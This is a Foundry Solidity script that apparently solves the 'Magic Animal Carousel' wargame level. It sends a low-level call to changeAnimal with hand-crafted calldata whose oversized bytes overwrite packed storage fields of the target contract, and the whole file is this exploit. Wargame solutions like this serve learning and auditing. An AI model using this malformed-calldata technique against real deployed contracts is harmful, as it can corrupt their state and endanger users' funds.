// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/MagicAnimalCarousel.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MagicAnimalCarouselSolution is Script {
    MagicAnimalCarousel public magicAnimalCarousel = MagicAnimalCarousel(0xAaA16aF9a1eB72844b8162860937D6C1Fa21fCaE);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Before currentCrateId : ", magicAnimalCarousel.currentCrateId());
        console.log("Before carousel[0] : ", magicAnimalCarousel.carousel(0));

        magicAnimalCarousel.setAnimalAndSpin("pig");
        
        bytes memory payload = abi.encodePacked(
            uint256(64), uint256(1), uint256(12), hex"ffffffffffffffffffffffff"
        );

        address(magicAnimalCarousel).call(abi.encodePacked(magicAnimalCarousel.changeAnimal.selector, payload));

        magicAnimalCarousel.setAnimalAndSpin("lion");

        console.log("After currentCrateId : ", magicAnimalCarousel.currentCrateId());

        vm.stopBroadcast();
    }
}